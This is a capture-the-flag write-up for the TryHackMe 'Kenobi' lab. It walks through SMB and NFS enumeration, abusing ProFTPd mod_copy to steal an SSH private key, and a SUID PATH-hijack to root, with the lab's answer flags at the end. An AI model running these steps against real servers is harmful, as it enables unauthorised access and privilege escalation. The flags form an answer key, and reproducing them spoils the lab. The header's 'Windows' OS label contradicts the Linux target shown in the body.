# Kenobi

- MachineIP: `10.10.160.110`
- OS       : `Windows`
- Exploit  : `Samnba, rpc nfs share, suid, path manupulation`

---

- Nmap recon, 21`(ftp)`,22`(ssh)`,80`(http)`,111`(rpcbind)`,139`(netbios)`,445`(samba)`,2049`(nfs)`
- Shows `7` known open ports
- Since samba ports are open lets enumerate samba shares

```bash
# with nmap
┌──(kali㉿kali)-[~/writeups/thm/kenobi]                                                                                 
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.160.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 08:19 EDT
Nmap scan report for 10.10.160.110
Host is up (0.24s latency).                  
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
[..snip..]

# with crackmapexec
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ crackmapexec smb 10.10.160.110 -u '' -p '' --shares
SMB         10.10.160.110   445    KENOBI           [*] Windows 6.1 (name:KENOBI) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.160.110   445    KENOBI           [+] \: 
SMB         10.10.160.110   445    KENOBI           [+] Enumerated shares
SMB         10.10.160.110   445    KENOBI           Share           Permissions     Remark
[..snip..]
```

- Access the share which we have access to and download the files

```bash
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ smbclient //10.10.160.110/anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877116 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (9.3 KiloBytes/sec) (average 9.3 KiloBytes/sec)

```

- Enumerating the nmap for services

```bash
┌──(kali㉿kali)-[~/writeups/thm/kenobi]                                                                                                          
└─$ nmap -p21,22,80,111,139,445,2049,34023,50323,51297,56499 -sV -sC -oN services.nmap 10.10.160.110 -vv  

[..snip..]
```

- The protftd version enumerated is `1.3.5`
- Lets enumerate known vulnerabilites in the proftp version with searchsploit

```bash
# install searchsploit
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ sudo apt update && sudo apt -y install exploitdb

# searching exploits
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ searchsploit proftp 1.3.5
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                      | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                            | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                      | linux/remote/36742.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
```

- Lets abuset the mod_copy `rce`

> The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

```bash
# connect to the machine
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ nc 10.10.150.127 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.150.127]
SITE CPFR /home/kenobi/.ssh/id_rsa     # SITE COPYFROM {LOCAITON} (location identified from the log.txt)
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa                  # The share in the rpc bind
250 Copy successful
```

- Enumerate the available disk shares from the rpc bind

```bash
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.150.127 -oN rpcbind.nmap

[..snip..]
```

- Mount the available share to the machine

```bash
# make a directory to mount the share
┌──(kali㉿kali)-[~/writeups/thm/kenobi]                                                                                                          
└─$ sudo mkdir /mnt/kenobiNFS

# mount the share to the created directory
┌──(kali㉿kali)-[~/writeups/thm/kenobi]                                                                                                          
└─$ sudo mount -t nfs 10.10.150.127:/var /mnt/kenobiNFS/                                                                                         

# list the mounted share
┌──(kali㉿kali)-[~/writeups/thm/kenobi]                                                                                                          
└─$ ls -la /mnt/kenobiNFS/                                                                                                                       
total 56                                                                                                                                         
drwxr-xr-x 14 root root    4096 Sep  4  2019 .                                                                                                   
drwxr-xr-x  4 root root    4096 May  7 02:00 ..
drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
[..snip..]
```

- The copied id_rsa of kenboi can be found in the /tmp directory of the mounted share

```bash
# copy the ssh key from mounted location to pwd
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ cp /mnt/kenobiNFS/tmp/id_rsa .

# change permission for the file
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ chmod 600 id_rsa 

# use the private key to login to the machine
┌──(kali㉿kali)-[~/writeups/thm/kenobi]
└─$ ssh -i id_rsa kenobi@10.10.150.127
[..snip..]
# logged into the machine
kenobi@kenobi:~$ whoami;hostname
kenobi
kenobi
```

- Find a way to privesc
- Looking for any running databases, nothing there
- Lets find binaries with setuid set

<p align="center">
  <img src="bin-perm.png" />
</p>


> SETUID binaries executes the binary as the user who owns it
> SETGID binaries executes the binary as the member of the group member who owns it
> STICKYBIT no Meaning

- To find the setuid binaires

```bash
# find setuid binaries
kenobi@kenobi:/home$ find / -perm -u=s 2>/dev/null  

# checking the fine type of the binary which is not default
kenobi@kenobi:/home$ file /usr/bin/menu
/usr/bin/menu: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/L
inux 2.6.32, BuildID[sha1]=0928a845a7eef506cb3bb698377bf15bfd0dcb47, not stripped
```

- Now we have a binary which is not there by default since its a binary, lets check its permission and obtains the strings in the binary

```bash
# checking permission, SUID is set on the binary
kenobi@kenobi:/tmp$ ls -la /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu

# obtaing strings from the binary
kenobi@kenobi:/home$ strings /usr/bin/menu
[..snip..]
***************************************                                                                                                          
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
[..snip..]
```

- The commands `curl`, `uname` and `ifconfig` are just executed with the word and not the full path, we could create a malicious file and alter the execution path to obtain the reverse shell as root

- PATH ==> tells all the variables to look for commands from first to last

```bash
# contents of PATH variable
kenobi@kenobi:/tmp$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

# now lets create a file and obatain root shell
kenobi@kenobi:/tmp$ vi ifconfig
# adding the exection permission
kenobi@kenobi:/tmp$ chmod +x ifconfig
# contents of ifconfig
kenobi@kenobi:/tmp$ cat ifconfig 
#!/bin/bash
/bin/sh

# add the path of the created ifconfig to the PATH variable
kenobi@kenobi:/tmp$ export PATH=$PATH:/tmp  # this wont work as we expected since the altered ifconfig's location is at the last, bash finds the first matching path and executes it

# add the altred ifconfig's path to the first so it will be interuppted first
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH

# execute the application to obtain reverse shell as root
kenobi@kenobi:/tmp$ /usr/bin/menu                                        

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

- Machine owned with `Suid and Path manupulation`

## Answers

### Deploy the Vulnerable Machine

- Scan the machine with nmap, how many ports are open?
`7`

### Enumerating Samba for shares

- Using the nmap command above, how many shares have been found?
`3`

- Once you're connected, list the files on the share. What is the file can you see?
`log.txt`

- What port is FTP running on?
`21`

- What mount can we see?
`/var`

### Gain initial access with ProFtpd

- What is the version?
`1.3.5`

- How many exploits are there for the ProFTPd running?
`3`

- What is Kenobi's user flag (/home/kenobi/user.txt)?
`d0b0f3f53b6caa532a83915e19224899`

### Privilege Escalation with path varibale manupulation

- What file looks particularly out of the ordinary? 
`/usr/bin/menu`

- Run the binary, how many options appear?
`3`

- What is the root flag (/root/root.txt)?

`177b3cd8562289f37382721c28381f02`